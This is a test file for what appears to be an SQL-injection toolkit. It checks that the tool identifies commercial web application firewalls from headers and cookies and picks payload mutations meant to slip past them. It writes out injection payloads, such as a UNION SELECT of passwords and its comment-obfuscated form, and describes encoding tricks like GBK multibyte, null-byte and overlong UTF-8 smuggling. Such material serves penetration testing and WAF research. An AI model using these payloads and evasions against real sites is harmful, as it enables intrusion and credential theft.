import { describe, it, expect } from 'vitest';
import { MetamorphicStudio } from './engine/MetamorphicStudio';

describe('MetamorphicStudio — Interactive AST Tokenization & WAF Simulation', () => {
  it('tokenizes SQL query into keywords, literals, operators, and comments', () => {
    const sql = "SELECT username FROM users WHERE id = 101 /* inline */";
    const tokens = MetamorphicStudio.tokenize(sql);
    expect(tokens.length).toBeGreaterThan(5);

    const keywords = tokens.filter((t) => t.type === 'keyword');
    expect(keywords.some((k) => k.value.toUpperCase() === 'SELECT')).toBe(true);
    expect(keywords.some((k) => k.value.toUpperCase() === 'FROM')).toBe(true);
    expect(keywords.some((k) => k.value.toUpperCase() === 'WHERE')).toBe(true);

    const comments = tokens.filter((t) => t.type === 'comment');
    expect(comments.length).toBe(1);
    expect(comments[0].value).toContain('inline');
  });

  it('applies metamorphic transform pipeline (E1, E7)', () => {
    const base = "UNION SELECT 1, 2 FROM users";
    const transformed = MetamorphicStudio.applyTransformPipeline(base, ['E1_INLINE_COMMENT_SPACE']);
    expect(transformed).toContain('/**/');
    expect(transformed).not.toContain('UNION SELECT');
  });

  it('simulates Cloudflare WAF inspection and flags raw classic UNION SELECT', () => {
    const rawPayload = "' UNION SELECT password FROM users--";
    const sim = MetamorphicStudio.simulateWafInspection(rawPayload, 'cloudflare');
    expect(sim.blocked).toBe(true);
    expect(sim.score).toBeGreaterThanOrEqual(50);
    expect(sim.matchedRules.length).toBeGreaterThan(0);
  });

  it('simulates evasion when metamorphic inline comment transform is applied', () => {
    const evasivePayload = "'/**/uNiOn/**/sElEcT/**/password/**/fRoM/**/users--";
    const sim = MetamorphicStudio.simulateWafInspection(evasivePayload, 'cloudflare');
    expect(sim.evasionProbability).toBeGreaterThan(sim.score);
  });

  it('auto-detects Cloudflare WAF from cookies and headers and selects optimal transforms', () => {
    const cfReq = `POST /login HTTP/1.1\r\nHost: portal.example.com\r\nCookie: __cf_bm=xyz123; session=abc\r\ncf-ray: 87654321-IAD\r\nContent-Type: application/json\r\n\r\n{"username":"admin"}`;
    const result = MetamorphicStudio.detectWafFromRequest(cfReq);

    expect(result.detectedWaf).toBe('cloudflare');
    expect(result.confidence).toBeGreaterThanOrEqual(90);
    expect(result.recommendedTransforms).toContain('E1_INLINE_COMMENT_SPACE');
    expect(result.recommendedTransforms).toContain('E7_RANDOM_CASE_MUTATION');
    expect(result.reasons.some((r) => r.includes('__cf_bm'))).toBe(true);
    expect(result.reasons.some((r) => r.includes('cf-ray'))).toBe(true);
  });

  it('auto-detects AWS WAF from CloudFront headers and ALB cookies', () => {
    const awsReq = `GET /api/products?id=1 HTTP/1.1\r\nHost: d1234.cloudfront.net\r\nCookie: AWSALB=alpha123; AWSALBCORS=alpha123\r\nx-amz-cf-id: amz-trace-999\r\n\r\n`;
    const result = MetamorphicStudio.detectWafFromRequest(awsReq);

    expect(result.detectedWaf).toBe('aws');
    expect(result.recommendedTransforms).toContain('E9_HEX_LITERAL_ENCODING');
    expect(result.recommendedTransforms).toContain('E18_ARITHMETIC_TAUTOLOGY');
    expect(result.transformRationale['E9_HEX_LITERAL_ENCODING']).toBeDefined();
  });

  it('auto-detects ModSecurity from CRS session cookies and server header', () => {
    const modReq = `POST /submit HTTP/1.1\r\nHost: internal.corp.local\r\nCookie: OWASP_CRS=crs_val\r\nServer: mod_security\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nparam=test`;
    const result = MetamorphicStudio.detectWafFromRequest(modReq);

    expect(result.detectedWaf).toBe('modsecurity');
    expect(result.recommendedTransforms).toContain('E2_VERSION_COMMENT_MYSQL');
    expect(result.recommendedTransforms).toContain('E3_TAB_NEWLINE_WHITESPACE');
    expect(result.recommendedTransforms).toContain('E5_PARENTHESIS_SPACELESS');
  });

  it('auto-detects Imperva Incapsula from cookies and headers', () => {
    const impReq = `GET /search?q=query HTTP/1.1\r\nHost: protected.bank.com\r\nCookie: incap_ses_123=abc; visid_incap=xyz\r\nx-iinfo: 1-2-3-4\r\n\r\n`;
    const result = MetamorphicStudio.detectWafFromRequest(impReq);

    expect(result.detectedWaf).toBe('imperva');
    expect(result.recommendedTransforms).toContain('E4_VERTICAL_TAB_FORMFEED');
    expect(result.recommendedTransforms).toContain('E10_UNICODE_FULLWIDTH');
    expect(result.recommendedTransforms).toContain('E20_CONCAT_CHAR_STRING');
  });

  it('auto-detects Akamai Kona Site Defender from cookies and headers', () => {
    const akamaiReq = `GET /store HTTP/1.1\r\nHost: e123.akamaiedge.net\r\nCookie: ak_bmsc=abc987\r\nx-akamai-transformed: 9-c\r\n\r\n`;
    const result = MetamorphicStudio.detectWafFromRequest(akamaiReq);

    expect(result.detectedWaf).toBe('akamai');
    expect(result.recommendedTransforms).toContain('E17_LIKE_OP_EQUIVALENCE');
    expect(result.recommendedTransforms).toContain('E19_NULLIF_GREATEST_MUTATION');
  });

  it('handles Generic requests and tailors transforms to JSON vs XML content type', () => {
    const jsonReq = `POST /api HTTP/1.1\r\nHost: api.standard.local\r\nContent-Type: application/json\r\n\r\n{"data": 1}`;
    const jsonResult = MetamorphicStudio.detectWafFromRequest(jsonReq);
    expect(jsonResult.detectedWaf).toBe('generic');
    expect(jsonResult.inferredContentType).toBe('json');
    expect(jsonResult.recommendedTransforms).toContain('E1_INLINE_COMMENT_SPACE');

    const xmlReq = `POST /soap HTTP/1.1\r\nHost: soap.standard.local\r\nContent-Type: application/xml\r\n\r\n<xml><id>1</id></xml>`;
    const xmlResult = MetamorphicStudio.detectWafFromRequest(xmlReq);
    expect(xmlResult.inferredContentType).toBe('xml');
    expect(xmlResult.recommendedTransforms).toContain('E10_UNICODE_FULLWIDTH');
  });

  it('getOptimalTransformsForRequest adapts correctly when explicit WAF override is passed', () => {
    const rawReq = `GET /test HTTP/1.1\r\nHost: generic.test\r\n\r\n`;
    const res = MetamorphicStudio.getOptimalTransformsForRequest(rawReq, undefined, 'aws');
    expect(res.detectedWaf).toBe('aws');
    expect(res.transforms).toContain('E9_HEX_LITERAL_ENCODING');
  });

  it('guarantees complete suite of 30 metamorphic transforms (E1 - E30)', () => {
    const allTransforms = MetamorphicStudio.getAllTransforms();
    expect(allTransforms.length).toBe(30);

    const ids = allTransforms.map((t) => t.id);
    for (let i = 1; i <= 30; i++) {
      const expectedPrefix = `E${i}_`;
      expect(ids.some((id) => id.startsWith(expectedPrefix))).toBe(true);
    }
  });

  it('verifies newly added advanced evasion transforms execute accurately', () => {
    // E11 GBK Multibyte Smuggling
    expect(MetamorphicStudio.applyTransform("admin' OR 1=1", 'E11_GBK_MULTIBYTE_SMUGGLING')).toContain('%bf%27');
    
    // E12 Scientific Notation
    expect(MetamorphicStudio.applyTransform("1=1", 'E12_SCIENTIFIC_NOTATION')).toBe('1e0=1e0');

    // E13 Null Byte Terminator
    expect(MetamorphicStudio.applyTransform("admin'", 'E13_NULL_BYTE_TERMINATOR')).toContain("%00'");

    // E14 UTF-8 Overlong Encoding
    expect(MetamorphicStudio.applyTransform("admin'", 'E14_UTF8_OVERLONG_ENCODING')).toContain('%c0%27');

    // E15 HTML Hex Entity
    expect(MetamorphicStudio.applyTransform("admin' AND 1=1", 'E15_HTML_ENTITY_HEX')).toContain('&#x27;');

    // E21 Bitwise Operator Logic
    expect(MetamorphicStudio.applyTransform("id=1 AND 1=1", 'E21_BITWISE_OPERATOR_LOGIC')).toContain('& 1');

    // E22 Double Negative Logic
    expect(MetamorphicStudio.applyTransform("1=1", 'E22_DOUBLE_NEGATIVE_LOGIC')).toBe('NOT(NOT(1=1))');

    // E23 Semicolon Stacked Split
    expect(MetamorphicStudio.applyTransform("SELECT pg_sleep(3)", 'E23_SEMICOLON_STACKED_SPLIT')).toContain('; SELECT');

    // E24 Linebreak CRLF Split
    expect(MetamorphicStudio.applyTransform("UNION SELECT", 'E24_LINEBREAK_CRLF_SPLIT')).toContain('%0d%0a');

    // E25 Concat Comment Split
    expect(MetamorphicStudio.applyTransform("UNION SELECT", 'E25_CONCAT_COMMENT_SPLIT')).toBe('UN/**/ION SE/**/LECT');

    // E26 Parenthesis Function Wrap
    expect(MetamorphicStudio.applyTransform("SELECT id", 'E26_PARENTHESIS_FUNCTION_WRAP')).toBe('SELECT(id)');

    // E27 Regexp Operator Equivalence
    expect(MetamorphicStudio.applyTransform("1=1", 'E27_REGEXP_OPERATOR_EQUIV')).toBe('1 REGEXP 1');

    // E28 IN Operator Predicate
    expect(MetamorphicStudio.applyTransform("1=1", 'E28_IN_OPERATOR_PREDICATE')).toBe('1 IN (1,2)');

    // E29 JSON Escaped Delimiter
    expect(MetamorphicStudio.applyTransform("' OR 1=1", 'E29_JSON_ESCAPED_DELIMITER')).toContain('\\"');

    // E30 XML CDATA Wrapper
    expect(MetamorphicStudio.applyTransform("' OR 1=1", 'E30_XML_CDATA_WRAPPER')).toBe("<![CDATA[' OR 1=1]]>");
  });

  it('guarantees complete representation of G1-G17 depth ladder in SQL_PAYLOAD_CATALOG', async () => {
    const { SQL_PAYLOAD_CATALOG } = await import('./payloads/SqlPayloads');
    const levelsPresent = new Set(SQL_PAYLOAD_CATALOG.map((p) => p.level));

    for (let lvl = 1; lvl <= 17; lvl++) {
      expect(levelsPresent.has(lvl)).toBe(true);
    }
  });

  it('verifies real-world CVE archetypes are present in PayloadResearchCorpus', async () => {
    const { PayloadResearchCorpus } = await import('./PayloadResearchCorpus');
    const all = PayloadResearchCorpus.getAllPayloads();

    expect(all.some((p) => p.id === 'CVE_DRUPAL_2014_3704')).toBe(true);
    expect(all.some((p) => p.id === 'CVE_WORDPRESS_2022_21661')).toBe(true);
    expect(all.some((p) => p.id === 'CVE_MOVEIT_2023_34362')).toBe(true);
    expect(all.some((p) => p.id === 'CVE_DJANGO_2020_7471')).toBe(true);
  });

  it('verifies precision arithmetic overflow and XML error probes in ErrorTester', async () => {
    const { ErrorTester } = await import('./ErrorTester');
    const probes = ErrorTester.getPrecisionErrorProbes();

    expect(probes.some((p) => p.payload.includes('!(SELECT * FROM (SELECT 1)x)-~0'))).toBe(true);
    expect(probes.some((p) => p.payload.includes('query_to_xml'))).toBe(true);
    expect(probes.some((p) => p.payload.includes('ST_PointFromGeoHash'))).toBe(true);
    expect(probes.some((p) => p.payload.includes('sqlite_master'))).toBe(true);
  });
});
